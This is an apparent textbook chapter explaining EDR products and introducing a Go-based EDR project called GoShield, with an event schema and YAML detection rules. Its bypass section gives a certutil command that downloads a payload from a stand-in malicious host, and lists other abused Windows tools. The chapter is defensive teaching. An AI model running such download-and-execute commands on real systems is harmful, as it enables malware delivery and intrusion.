# Chapter 58: What Is an EDR? — CrowdStrike, SentinelOne, Palo Alto Explained

*Endpoint Detection and Response (EDR) is the most important category in enterprise security. In this chapter, you'll understand what it does, how commercial products work, and what you'll build.*

---

## The Problem EDR Solves

Traditional antivirus is dead. Here's why:

**Old approach (signature-based AV):**
1. Security vendor finds malware sample
2. Extracts a "signature" (unique byte pattern)
3. Distributes signature to all customers
4. AV scans files and blocks anything matching signatures

**Why this fails:**
- Attackers can change a few bytes and the signature doesn't match
- "Zero-day" attacks (never seen before) have no signature
- Fileless attacks run in memory — there's no file to scan
- Attackers now commonly generate unique malware per victim

**The modern threat:**
- Attackers dwell in networks for average 197 days before detection
- They move laterally, using legitimate tools (PowerShell, PsExec)
- Ransomware encrypts everything in minutes
- Data exfiltration is silent and slow

**What EDR adds:**
Instead of asking "does this file match a known bad signature?", EDR asks:
- **What is this process doing?** (behavior analysis)
- **Is this behavior pattern consistent with an attack?** (anomaly detection)
- **Can we trace what happened?** (forensic telemetry)
- **Can we stop it automatically?** (automated response)

---

## The EDR Stack

```
┌─────────────────────────────────────────────────────────┐
│                   EDR PLATFORM                          │
├─────────────────────────────────────────────────────────┤
│  Dashboard  │  Alerting  │  Hunting  │  Investigation   │
├─────────────────────────────────────────────────────────┤
│           Detection Engine                              │
│   Rules  │  ML Models  │  Behavioral Analysis          │
├─────────────────────────────────────────────────────────┤
│           Event Processing & Storage                    │
│   (SIEM) Ingest, normalize, correlate, retain          │
├─────────────────────────────────────────────────────────┤
│           Transport / Message Queue                     │
│   (Kafka/NATS) Events flow from agents to server       │
├─────────────────────────────────────────────────────────┤
│           EDR Agent (on every endpoint)                 │
│  Process  │  File  │  Network  │  Registry  │  Memory  │
└─────────────────────────────────────────────────────────┘
          Runs on every laptop/server being protected
```

---

## How Commercial EDR Products Work

### CrowdStrike Falcon

**Agent:** "Falcon Sensor" — a kernel driver + user-space agent. Runs on every protected endpoint.

**Data collection:**
- **Process events:** Every process creation, with command line, parent process, username
- **Network events:** Every DNS query, every TCP/UDP connection (with process attribution)
- **File events:** File creates, writes, deletes, renames
- **Registry events:** (Windows) Every registry read/write
- **Authentication events:** Login attempts, privilege escalation

**Transport:** Events stream to CrowdStrike's cloud (Threat Graph) in real-time.

**Detection:** "Threat Graph" correlates events across millions of endpoints globally. If a specific behavior pattern caused ransomware at 10,000 other companies, it's flagged when it appears at yours.

**Response:** Analyst can remotely kill processes, quarantine the endpoint, or the system can do it automatically.

**The business model:** ~$15-20/endpoint/month. 20,000+ enterprise customers. $3B+ annual revenue.

### SentinelOne Singularity

**Key differentiator:** Uses AI/ML behavioral models, not human-written rules. The "AI" watches process behavior and flags anomalies.

**Autonomous response:** SentinelOne can automatically kill and roll back ransomware — restoring encrypted files using VSS shadow copies — without human intervention.

**StoryLine:** Every related event is automatically linked into a "story" — the agent automatically chains: email opened → PDF opened → PowerShell spawned → network connection → file encrypted. Analysts see the full attack chain.

**Kubernetes:** SentinelOne's "Singularity Cloud" extends EDR to containers and cloud workloads.

### Palo Alto Networks Cortex XDR

**XDR (Extended):** Correlates endpoint, network, and cloud telemetry together. True XDR, not just EDR.

**Integration:** Ties into Palo Alto's Next-Gen Firewalls, Prisma Cloud, and WildFire (malware sandbox). When the firewall blocks a connection, XDR correlates it with the process that made it.

**BIOC (Behavioral Indicator of Compromise):** Rule language for writing behavioral detections — like YARA but for behaviors.

---

## What Attackers Do to Bypass EDR

Understanding bypass techniques is essential for building detection:

**1. LOLBAS (Living Off the Land Binaries, Scripts, and Libraries)**
Use legitimate Windows tools for malicious purposes:
- `powershell.exe -EncodedCommand ...` — run code in PowerShell
- `certutil.exe -urlcache -split -f http://malicious.com/payload.exe`
- `mshta.exe` — run scripts
- `regsvr32.exe` — run DLLs
These all look like legitimate admin activity to naive detectors.

**2. Process Injection**
Inject malicious code into a legitimate process (like `svchost.exe`). Now malicious code runs under a trusted process.

**3. Fileless attacks**
Malware lives entirely in memory — never writes to disk. Signature scanners miss it.

**4. EDR tampering**
Attackers with admin access try to stop/unload the EDR agent, tamper with its processes, or blind it.

**Implication for GoShield:** We need to monitor these specific behaviors, and protect the agent itself from tampering.

---

## GoShield — What We're Building

GoShield is a functional EDR system consisting of:

### Agent (runs on each endpoint)
```
goshield-agent
├── File Integrity Monitor    → watches file system changes
├── Process Monitor          → tracks process create/kill/network
├── Network Monitor          → connections per process
├── Config                   → what to watch, server to report to
└── Event Sender             → ships events to server via gRPC/HTTPS
```

### Server (receives events, stores, detects)
```
goshield-server
├── API Server               → REST API for agents and dashboard
├── Event Ingestion          → receives and stores events
├── Detection Engine         → applies rules to events
├── Alert Manager            → sends alerts (webhook, email)
└── Storage                  → time-series event store
```

### Detection Engine
```
goshield-detector
├── YAML rule definitions    → similar to Sigma rules
├── Rule evaluator           → matches events against rules
└── Alert generator          → produces structured alerts
```

### Dashboard
```
goshield-ui
├── REST API                 → /api/v1/events, /alerts, /agents
├── Web interface            → HTML/JS dashboard
└── Hunt interface           → search and pivot on events
```

---

## Event Schema — What We Collect

Every event has a common base:

```go
// pkg/events/types.go
package events

import "time"

// EventType categorizes events
type EventType string

const (
    EventTypeProcess   EventType = "process"
    EventTypeFile      EventType = "file"
    EventTypeNetwork   EventType = "network"
    EventTypeLogin     EventType = "login"
    EventTypeAlert     EventType = "alert"
)

// BaseEvent is common to all events
type BaseEvent struct {
    ID        string    `json:"id"`
    AgentID   string    `json:"agent_id"`
    Hostname  string    `json:"hostname"`
    Timestamp time.Time `json:"timestamp"`
    Type      EventType `json:"type"`
}

// ProcessEvent captures process creation/termination
type ProcessEvent struct {
    BaseEvent
    Action      string `json:"action"`      // "create" or "terminate"
    PID         int    `json:"pid"`
    PPID        int    `json:"ppid"`
    Name        string `json:"name"`         // e.g. "powershell.exe"
    CommandLine string `json:"command_line"`
    Username    string `json:"username"`
    ExePath     string `json:"exe_path"`
    Hash        string `json:"hash"`        // SHA256 of executable
}

// FileEvent captures file system changes
type FileEvent struct {
    BaseEvent
    Action   string `json:"action"`   // "create", "write", "delete", "rename"
    Path     string `json:"path"`
    Size     int64  `json:"size"`
    Hash     string `json:"hash"`
    IsHidden bool   `json:"is_hidden"`
    PID      int    `json:"pid"`      // Which process did this?
    Process  string `json:"process"`  // Process name
}

// NetworkEvent captures network connections
type NetworkEvent struct {
    BaseEvent
    Action      string `json:"action"`       // "connect", "listen", "close"
    Protocol    string `json:"protocol"`     // "tcp" or "udp"
    LocalIP     string `json:"local_ip"`
    LocalPort   int    `json:"local_port"`
    RemoteIP    string `json:"remote_ip"`
    RemotePort  int    `json:"remote_port"`
    PID         int    `json:"pid"`
    Process     string `json:"process"`
    Domain      string `json:"domain"`       // DNS name if resolved
    BytesSent   int64  `json:"bytes_sent"`
    BytesRecv   int64  `json:"bytes_recv"`
}
```

---

## Detection Rules — YAML Format

We'll define detection rules in YAML (similar to Sigma rules used by CrowdStrike and SentinelOne):

```yaml
# rules/proc_powershell_encoded.yaml
name: PowerShell Encoded Command
id: PSH-001
severity: high
description: |
  Detects PowerShell executing a base64-encoded command.
  Attackers encode payloads to bypass detection.
  
references:
  - https://attack.mitre.org/techniques/T1059/001/
  
mitre:
  tactic: Execution
  technique: T1059.001 - PowerShell

condition:
  event_type: process
  all_of:
    - field: name
      contains: "powershell"
      case_insensitive: true
    - field: command_line
      contains_any: ["-EncodedCommand", "-enc ", "-ec "]
      case_insensitive: true

response:
  alert: true
  kill_process: false   # too noisy — just alert
  quarantine: false
```

```yaml
# rules/ransomware_mass_encryption.yaml
name: Possible Ransomware — Mass File Encryption
id: RAN-001
severity: critical
description: |
  Detects rapid mass creation/modification of files with known
  ransomware extensions. May indicate active ransomware.

condition:
  event_type: file
  threshold:
    count: 50
    window: 30s    # 50 file writes in 30 seconds
    by: pid
  any_of:
    - field: path
      ends_with_any: [".encrypted", ".locked", ".crypto", ".enc", ".crypt"]
    - field: action
      equals: "write"
      and:
        field: path
        not_ends_with_any: [".log", ".tmp"]

response:
  alert: true
  kill_process: true   # automatically kill the encrypting process
  quarantine: true     # quarantine the endpoint
```

---

## Architecture: Agent → Server → Detection

```
[Endpoint]                    [GoShield Server]
   │                               │
   │ goshield-agent                │
   │                               │
   │ 1. File system watch          │
   │ 2. Process monitor      ──────▶ 3. Receive events
   │ 3. Network monitor            │
   │                               │ 4. Apply detection rules
   │                               │
   │                         ──────▶ 5. Generate alert
   │                               │
   │ 6. Receive response     ◀──────│
   │    (kill process,             │
   │     quarantine)               │ 7. Store in DB
   │                               │
                                   │ 8. Dashboard shows alert
```

---

## Why Go for GoShield?

| Requirement | Go capability |
|-------------|---------------|
| Low overhead on endpoints | Go compiles to small, fast binaries |
| File system watching | `fsnotify` library |
| Cross-platform | One codebase for Linux/Windows/Mac |
| Concurrent event processing | Goroutines |
| gRPC communication | `google.golang.org/grpc` |
| YAML rule parsing | `gopkg.in/yaml.v3` |
| REST API server | `net/http` + `gorilla/mux` |
| Time-series queries | Standard database/sql |

---

## Summary

| Product | Key differentiator | GoShield equivalent |
|---------|--------------------|---------------------|
| CrowdStrike | Threat Graph cloud correlation | Detection engine with rules |
| SentinelOne | Autonomous AI response + rollback | Auto-kill + alert |
| Palo Alto XDR | Cross-telemetry correlation | Process+File+Network correlation |

GoShield implements the core of what these products do:
- Agent collecting telemetry
- Central server ingesting events
- Rule-based detection engine
- Automated response
- Dashboard for analysts

Let's build it.

---

## Exercises

1. Research CrowdStrike's 2024 "outage" incident. What happened? What does it tell you about the risks of kernel-level security software?
2. Download and set up the free tier of CrowdStrike or SentinelOne (both offer free trials). Look at what events they collect.
3. Research the MITRE ATT&CK framework — what is it and why do EDR vendors reference it?
4. Look at Sigma rules (github.com/SigmaHQ/sigma) — these are the open-source detection rules that GoShield's YAML format is inspired by.
5. Plan your GoShield deployment: what would you monitor on a web server vs a developer laptop?
